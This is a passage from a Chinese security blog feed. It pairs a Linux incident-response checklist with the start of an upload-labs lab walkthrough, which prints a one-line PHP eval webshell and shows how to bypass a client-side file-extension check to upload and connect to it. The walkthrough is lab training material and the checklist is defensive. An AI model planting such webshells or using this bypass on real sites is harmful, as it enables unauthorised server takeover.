i</code>命令获取用户信息，并使用<code>awk</code>和<code>sed</code>命令提取出IP地址部分。</li><li><code>if [ &quot;$USER_IP&quot; = &quot;&quot; ]</code>: 这是一个条件语句，检查<code>USER_IP</code>变量是否为空。</li><li><code>then</code>: 如果<code>USER_IP</code>为空，则执行下面的代码块。</li><li><code>USER_IP=</code>hostname&#96;&#96;: 这一行代码获取主机名并将其赋值给<code>USER_IP</code>变量。</li><li><code>fi</code>: 条件语句的结束标记。</li><li><code>export HISTTIMEFORMAT=&quot;%F %T $USER_IP </code>whoami<code> &quot;</code>: 这一行代码设置了一个环境变量<code>HISTTIMEFORMAT</code>，它定义了命令历史记录中时间戳的格式。<code>%F</code>代表完整的日期（年-月-日），<code>%T</code>代表时间（时:分:秒），<code>$USER_IP</code>代表用户的IP地址，<code>whoami</code>代表当前用户名。</li><li><code>shopt -s histappend</code>: 这一行代码启用了命令历史记录的追加模式。这意味着新的命令会追加到历史记录文件中，而不是覆盖之前的内容。</li><li><code>export PROMPT_COMMAND=&quot;history -a&quot;</code>: 这一行代码设置了一个环境变量<code>PROMPT_COMMAND</code>，它定义了在每次命令提示符显示之前会执行的命令。在这里，它执行<code>history -a</code>命令，将当前的命令添加到历史记录文件中。</li></ol><p>通过使用这些代码，每次执行命令时，都会将命令及其执行时间、用户IP地址和用户名记录到历史记录文件中。这样可以方便地查看命令执行的时间和相关信息。</p><p><strong>入侵排查：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入用户目录下</span><br><span class="line">cat .bash_history &gt;&gt; history.txt</span><br></pre></td></tr></table></figure><h3 id="2-3-检查异常端口"><a href="#2-3-检查异常端口" class="headerlink" title="2.3 检查异常端口"></a>2.3 检查异常端口</h3><p>使用netstat 网络连接命令，分析可疑端口、IP、PID</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -antlp|more</span><br><span class="line"></span><br><span class="line">查看下pid所对应的进程文件路径，</span><br><span class="line">运行ls -l /proc/$PID/exe或file /proc/$PID/exe（$PID 为对应的pid 号）</span><br></pre></td></tr></table></figure><p>下面是对<code>netstat -antlp</code>命令中使用的参数的解释：</p><ul><li><code>-a</code>（all）：显示所有的连接和监听端口，包括正在侦听（LISTEN）的和非侦听的连接。</li><li><code>-n</code>（numeric）：以数字形式显示IP地址和端口号，而不进行反向解析。</li><li><code>-t</code>（tcp）：仅显示TCP连接信息。</li><li><code>-l</code>（listening）：仅显示正在侦听（LISTEN）的连接。</li><li><code>-p</code>（program）：显示与每个连接关联的进程&#x2F;程序的PID和名称。</li></ul><p>综合起来，<code>netstat -antlp</code>命令将显示所有的TCP连接和监听端口的详细信息，包括本地地址和端口、远程地址和端口、连接状态、PID和进程&#x2F;程序名称。</p><p><img src="/../image/image-20240707165749383-1723802059794-29.png" alt="image-20240707165749383"></p><p><img src="/../image/image-20240707165825421-1723802059794-31.png" alt="image-20240707165825421"></p><h3 id="2-4-检查异常进程"><a href="#2-4-检查异常进程" class="headerlink" title="2.4 检查异常进程"></a>2.4 检查异常进程</h3><p>使用ps命令，分析进程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps aux | grep pid</span><br></pre></td></tr></table></figure><h3 id="2-5-检查开机启动项"><a href="#2-5-检查开机启动项" class="headerlink" title="2.5 检查开机启动项"></a>2.5 检查开机启动项</h3><p><strong>基本使用：</strong></p><p>系统运行级别示意图：</p><table><thead><tr><th align="center">运行级别</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">关机</td></tr><tr><td align="center">1</td><td align="center">单用户模式，可以想象为windows的安全模式，主要用于系统修复</td></tr><tr><td align="center">2</td><td align="center">不完全的命令行模式，不含NFS服务</td></tr><tr><td align="center">3</td><td align="center">完全的命令行模式，就是标准字符界面</td></tr><tr><td align="center">4</td><td align="center">系统保留</td></tr><tr><td align="center">5</td><td align="center">图形模式</td></tr><tr><td align="center">6</td><td align="center">重启动</td></tr></tbody></table><p>查看运行级别命令 runlevel</p><p>系统默认允许级别</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi  /etc/inittab</span><br><span class="line">id=3：initdefault  系统开机后直接进入哪个运行级别</span><br></pre></td></tr></table></figure><p>开机启动配置文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/rc.local</span><br><span class="line">/etc/rc.d/rc[0~6].d</span><br></pre></td></tr></table></figure><p>例子:当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在&#x2F;etc&#x2F;init.d目录下，然后在&#x2F;etc&#x2F;rc.d&#x2F;rc*.d中建立软链接即可</p><p>这里我们写一个简单的bash脚本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取CPU使用率</span></span><br><span class="line">cpu_usage=$(top -bn1 | grep <span class="string">&quot;Cpu(s)&quot;</span> | awk <span class="string">&#x27;&#123;print $2 + $4&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取内存使用率</span></span><br><span class="line">mem_total=$(free -m | awk <span class="string">&#x27;/Mem/ &#123;print $2&#125;&#x27;</span>)</span><br><span class="line">mem_used=$(free -m | awk <span class="string">&#x27;/Mem/ &#123;print $3&#125;&#x27;</span>)</span><br><span class="line">mem_usage=$(<span class="built_in">echo</span> <span class="string">&quot;scale=2; <span class="variable">$mem_used</span> / <span class="variable">$mem_total</span> * 100&quot;</span> | bc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取磁盘空间使用率</span></span><br><span class="line">disk_usage=$(<span class="built_in">df</span> -h | awk <span class="string">&#x27;$NF == &quot;/&quot; &#123;print $5&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印资源占用情况</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;CPU使用率: <span class="variable">$cpu_usage</span>%&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;内存使用率: <span class="variable">$mem_usage</span>%&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;磁盘空间使用率: <span class="variable">$disk_usage</span>&quot;</span></span><br></pre></td></tr></table></figure><p>赋予权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x myscript.sh</span><br></pre></td></tr></table></figure><p>试着执行一下先</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost init.d]# ./myscript.sh </span><br><span class="line">CPU使用率: 21.1%</span><br><span class="line">内存使用率: 57.00%</span><br><span class="line">磁盘空间使用率: 84%</span><br></pre></td></tr></table></figure><p>修改 &#x2F;etc&#x2F;rc.d&#x2F;rc.local 文件 </p><p>此处myscript是具体服务的脚本文件，S100myscript是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。</p><p>重启一下试试，这种echo的好像不好测试，试一下重定向到文件中</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">date</span> &gt;&gt; /home/youzipii/output.txt</span><br><span class="line"> </span><br><span class="line">hostname &gt;&gt; /home/youzipii/output.txt</span><br></pre></td></tr></table></figure><p><strong>入侵排查：</strong></p><p>启动项文件： more &#x2F;etc&#x2F;rc.local &#x2F;etc&#x2F;rc.d&#x2F;rc[0~6].d ls -l &#x2F;etc&#x2F;rc.d&#x2F;rc3.d&#x2F;</p><h3 id="2-6-检查定时任务"><a href="#2-6-检查定时任务" class="headerlink" title="2.6 检查定时任务"></a>2.6 检查定时任务</h3><p><strong>基本使用</strong></p><p>1、利用crontab创建计划任务</p><ul><li>基本命令</li></ul><p>crontab -l 列出某个用户cron服务的详细内容</p><p><img src="/../image/image-20240707201803850-1723802059794-32.png" alt="image-20240707201803850"></p><p>不同权限执行有差别</p><p>Tips：默认编写的crontab文件会保存在 (&#x2F;var&#x2F;spool&#x2F;cron&#x2F;用户名 例如: &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</p><p>crontab -r 删除每个用户cront任务(谨慎：删除所有的计划任务)</p><p>crontab -e 使用编辑器编辑当前的crontab文件</p><p>如：*&#x2F;1* * echo “hello world” &gt;&gt; &#x2F;tmp&#x2F;test.txt 每分钟写入文件</p><p>2、利用anacron实现异步定时任务调度</p><ul><li>使用案例</li></ul><p>每天运行 &#x2F;home&#x2F;backup.sh脚本： vi &#x2F;etc&#x2F;anacrontab @daily 10 example.daily &#x2F;bin&#x2F;bash &#x2F;home&#x2F;backup.sh</p><p>当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。</p><p><strong>入侵排查</strong></p><p>重点关注以下目录中是否存在恶意脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/spool/cron/* </span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/* </span><br><span class="line">/etc/cron.hourly/* </span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br></pre></td></tr></table></figure><p>小技巧：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more /etc/cron.daily/*  查看目录下所有文件</span><br></pre></td></tr></table></figure><h3 id="2-7-检查服务"><a href="#2-7-检查服务" class="headerlink" title="2.7 检查服务"></a>2.7 检查服务</h3><p><strong>服务自启动</strong></p><p>第一种修改方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chkconfig [--level 运行级别] [独立服务名] [on|off]</span><br><span class="line">chkconfig –level  2345 httpd on  开启自启动</span><br><span class="line">chkconfig httpd on （默认level是2345）</span><br></pre></td></tr></table></figure><p>第二种修改方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改/etc/re.d/rc.local 文件  </span><br><span class="line">加入 /etc/init.d/httpd start</span><br></pre></td></tr></table></figure><p>第三种修改方法：</p><p>使用ntsysv命令管理自启动，可以管理独立服务和xinetd服务。</p><p><strong>入侵排查</strong></p><p>1、查询已安装的服务：</p><p>RPM包安装的服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chkconfig  --list  查看服务自启动状态，可以看到所有的RPM包安装的服务</span><br><span class="line">ps aux | grep crond 查看当前服务</span><br><span class="line"></span><br><span class="line">系统在3与5级别下的启动项 </span><br><span class="line">中文环境</span><br><span class="line">chkconfig --list | grep &quot;3:启用\|5:启用&quot;</span><br><span class="line">英文环境</span><br><span class="line">chkconfig --list | grep &quot;3:on\|5:on&quot;</span><br></pre></td></tr></table></figure><p>源码包安装的服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看服务安装位置 ，一般是在/user/local/</span><br><span class="line">service httpd start</span><br><span class="line">搜索/etc/rc.d/init.d/  查看是否存在</span><br></pre></td></tr></table></figure><h3 id="2-8-检查异常文件"><a href="#2-8-检查异常文件" class="headerlink" title="2.8 检查异常文件"></a>2.8 检查异常文件</h3><p>1、查看敏感目录，如&#x2F;tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性</p><p>2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p> 可以使用find命令来查找，如 find &#x2F;opt -iname “*” -atime 1 -type f 找出 &#x2F;opt 下一天前访问过的文件</p><p>3、针对可疑文件可以使用stat进行创建修改时间。</p><h4 id="1-9-检查系统日志"><a href="#1-9-检查系统日志" class="headerlink" title="1.9 检查系统日志"></a>1.9 检查系统日志</h4><p>日志默认存放位置：&#x2F;var&#x2F;log&#x2F;</p><p>查看日志配置情况：more &#x2F;etc&#x2F;rsyslog.conf</p><table><thead><tr><th align="center">日志文件</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">&#x2F;var&#x2F;log&#x2F;cron</td><td align="center">记录了系统定时任务相关的日志</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;cups</td><td align="center">记录打印信息的日志</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;dmesg</td><td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;mailog</td><td align="center">记录邮件信息</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;message</td><td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;btmp</td><td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;lastlog</td><td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;wtmp</td><td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;utmp</td><td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td></tr><tr><td align="center">&#x2F;var&#x2F;log&#x2F;secure</td><td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr></tbody></table><p>日志分析技巧：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line"> grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line"></span><br><span class="line">2、登录成功的IP有哪些：     </span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali</span><br><span class="line">, shell=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; /var/log/secure </span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line"># grep &quot;userdel&quot; /var/log/secure</span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure><h3 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h3><h4 id="2-1-Rootkit查杀"><a href="#2-1-Rootkit查杀" class="headerlink" title="2.1 Rootkit查杀"></a>2.1 Rootkit查杀</h4><ul><li><p>chkrootkit</p><p>网址：<a href="http://www.chkrootkit.org/">http://www.chkrootkit.org</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit-0.52</span><br><span class="line">make sense</span><br><span class="line">#编译完成没有报错的话执行检查</span><br><span class="line">./chkrootkit</span><br></pre></td></tr></table></figure></li><li><p>rkhunter</p><p>网址：<a href="http://rkhunter.sourceforge.net/">http://rkhunter.sourceforge.net</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz</span><br><span class="line">tar -zxvf rkhunter-1.4.4.tar.gz</span><br><span class="line">cd rkhunter-1.4.4</span><br><span class="line">./installer.sh --install</span><br><span class="line">rkhunter -c</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-2-病毒查杀"><a href="#2-2-病毒查杀" class="headerlink" title="2.2 病毒查杀"></a>2.2 病毒查杀</h4><ul><li><p>Clamav</p><p>ClamAV的官方下载地址为：<a href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a></p><p>安装方式一：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、安装zlib：</span><br><span class="line">wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz </span><br><span class="line">tar -zxvf  zlib-1.2.7.tar.gz</span><br><span class="line">cd zlib-1.2.7</span><br><span class="line">#安装一下gcc编译环境： yum install gcc</span><br><span class="line">CFLAGS=&quot;-O3 -fPIC&quot; ./configure --prefix= /usr/local/zlib/</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">2、添加用户组clamav和组成员clamav：</span><br><span class="line">groupadd clamav</span><br><span class="line">useradd -g clamav -s /bin/false -c &quot;Clam AntiVirus&quot; clamav</span><br><span class="line"></span><br><span class="line">3、安装Clamav</span><br><span class="line">tar –zxvf clamav-0.97.6.tar.gz</span><br><span class="line">cd clamav-0.97.6</span><br><span class="line">./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">4、配置Clamav</span><br><span class="line">mkdir /opt/clamav/logs</span><br><span class="line">mkdir /opt/clamav/updata</span><br><span class="line">touch /opt/clamav/logs/freshclam.log</span><br><span class="line">touch /opt/clamav/logs/clamd.log</span><br><span class="line">cd /opt/clamav/logs</span><br><span class="line">chown clamav:clamav clamd.log</span><br><span class="line">chown clamav:clamav freshclam.log</span><br><span class="line"></span><br><span class="line">5、ClamAV 使用：</span><br><span class="line"> /opt/clamav/bin/freshclam 升级病毒库</span><br><span class="line">./clamscan –h 查看相应的帮助信息</span><br><span class="line">./clamscan -r /home  扫描所有用户的主目录就使用</span><br><span class="line">./clamscan -r --bell -i /bin  扫描bin目录并且显示有问题的文件的扫描结果</span><br></pre></td></tr></table></figure><p>安装方式二：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#安装</span><br><span class="line">yum install -y clamav</span><br><span class="line">#更新病毒库</span><br><span class="line">freshclam</span><br><span class="line">#扫描方法</span><br><span class="line">clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log</span><br><span class="line">clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log</span><br><span class="line">clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log</span><br><span class="line">#扫描并杀毒</span><br><span class="line">clamscan -r  --remove  /usr/bin/bsd-port</span><br><span class="line">clamscan -r  --remove  /usr/bin/</span><br><span class="line">clamscan -r --remove  /usr/local/zabbix/sbin</span><br><span class="line">#查看日志发现</span><br><span class="line">cat /root/usrclamav.log |grep FOUND</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-3-webshell查杀"><a href="#2-3-webshell查杀" class="headerlink" title="2.3 webshell查杀"></a>2.3 webshell查杀</h4><p>linux版：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">河马webshell查杀：http://www.shellpub.com</span><br><span class="line">深信服Webshell网站后门检测工具：http://edr.sangfor.com.cn/backdoor_detection.html</span><br></pre></td></tr></table></figure><h4 id="2-4-RPM-check检查"><a href="#2-4-RPM-check检查" class="headerlink" title="2.4 RPM check检查"></a>2.4 RPM check检查</h4><p> 系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./rpm -Va &gt; rpm.log</span><br></pre></td></tr></table></figure><p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">验证内容中的8个信息的具体内容如下：</span><br><span class="line">        S         文件大小是否改变</span><br><span class="line">        M         文件的类型或文件的权限（rwx）是否被改变</span><br><span class="line">        5         文件MD5校验是否改变（可以看成文件内容是否改变）</span><br><span class="line">        D         设备中，从代码是否改变</span><br><span class="line">        L         文件路径是否改变</span><br><span class="line">        U         文件的属主（所有者）是否改变</span><br><span class="line">        G         文件的属组是否改变</span><br><span class="line">        T         文件的修改时间是否改变</span><br></pre></td></tr></table></figure><p>如果命令被替换了，如果还原回来：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件提取还原案例：</span><br><span class="line">rpm  -qf /bin/ls  查询ls命令属于哪个软件包</span><br><span class="line">mv  /bin/ls /tmp  先把ls转移到tmp目录下，造成ls命令丢失的假象</span><br><span class="line">rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取rpm包中ls命令到当前目录的/bin/ls下</span><br><span class="line">cp /root/bin/ls  /bin/ 把ls命令复制到/bin/目录 修复文件丢失</span><br></pre></td></tr></table></figure><h4 id="2-5-linux安全检查脚本"><a href="#2-5-linux安全检查脚本" class="headerlink" title="2.5 linux安全检查脚本"></a>2.5 linux安全检查脚本</h4><p>Github项目地址：</p><p><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p><p><a href="https://github.com/ppabc/security_check">https://github.com/ppabc/security_check</a></p><p><a href="https://github.com/T0xst/linux">https://github.com/T0xst/linux</a></p><p>河马使用：<a href="https://blog.csdn.net/WEARE001/article/details/122862090">https://blog.csdn.net/WEARE001/article/details/122862090</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="/2024/08/15/upload-lab/"/>
      <url>/2024/08/15/upload-lab/</url>
      
        <content type="html"><![CDATA[<h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><p><em>项目地址：<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></em></p><p><em>攻略地址：<a href="https://www.cnblogs.com/chu-jian/p/15515770.html">https://www.cnblogs.com/chu-jian/p/15515770.html</a></em></p><p><em><a href="https://www.cnblogs.com/henry666/p/17051491.html">https://www.cnblogs.com/henry666/p/17051491.html</a></em></p><p><a href="https://www.freebuf.com/articles/web/287193.html">https://www.freebuf.com/articles/web/287193.html</a></p><p>整理一下文件上传思路</p><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p><img src="/../image/image-20240815103704350.png" alt="image-20240815103704350"></p><p>可以看到，要上传一个websehll上去，但上传区要求上传图片，先看看网页源码，有没有前端过滤。</p><p><img src="/../image/image-20240815103819718.png" alt="image-20240815103819718"></p><p>可以看到表单里有个checkFile的函数，跟进看下具体检查方法</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到对文件后缀进行了提取，再对比，我们可以抓包改后最绕过，先准备个webshell的图片马</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传时，抓包</p><p><img src="/../image/image-20240815111542381.png" alt="image-20240815111542381"></p><p>我们把这个改成1.php试试</p><p><img src="/../image/image-20240815111640434.png" alt="image-20240815111640434"></p><p>上传成功，然后可以看下传的文件到哪里去了</p><p><img src="/../image/image-20240815111932275.png" alt="image-20240815111932275"></p><p>路径是<code>../upload/1.php</code>，然后我们访问一下，看下能不能被访问</p><p><img src="/../image/image-20240815112106224.png" alt="image-20240815112106224"></p><p>可以被访问，拿蚁剑连接试试</p><p><img src="/../image/image-20240815112213091.png" alt="image-20240815112213091"></p><p>攻略中还提到了禁用js的方法，但这种方法有缺陷，因为禁用了js代码，如果在实战中，网站的一些正常功能可能无法显示。当然打靶通关是可以的。</p><p><img src="/../image/image-20240815112451171.png" alt="image-20240815112451171"></p><p>直接禁用，就可以直接上传php文件了，这里</p><p><img src="/../image/image-20240815112652632.png" alt="image-20240815112652632"></p><p>攻略里有个复制源码下来，去除这个js代码的方法，我觉得还是挺新鲜的，可以试试</p><p>保存源代码</p><p><img src="/../image/image-20240815113009099.png" alt="image-20240815113009099"></p><p>然后删除判断的js代码</p><p><img src="/../image/image-20240815125005614.png" alt="image-20240815125005614"></p><p>然后修改表单的action为上传目标地址</p><p>如果我们打开，是有上传文件的界面，但是不知道要上传给谁。这时我们返回到最开始，右键—检查—网络—然后上传一个正常的图片。这样我们就可以看到这个文件传给谁了。</p><p><img src="/../image/image-20240815125121367.png" alt="image-20240815125121367"></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p><img src="/../image/image-20240815125727732.png" alt="image-20240815125727732"></p><p>一样的界面，同样的思路，先看源码</p><p><img src="/../image/image-20240815125717038.png" alt="image-20240815125717038"></p><p>有前端过滤，查看过滤规则，但这个函数的具体内容没找到，先试试简单的改后缀，好像也上传成功了</p><p><img src="/../image/image-20240815130244335.png" alt="image-20240815130244335"></p><p><img src="/../image/image-20240815130326706.png" alt="image-20240815130326706"></p><p>也访问的到，看看蚁剑能不能连</p><p><img src="/../image/image-20240815130358747.png" alt="image-20240815130358747"></p><p>同样连接成功，看下源代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span 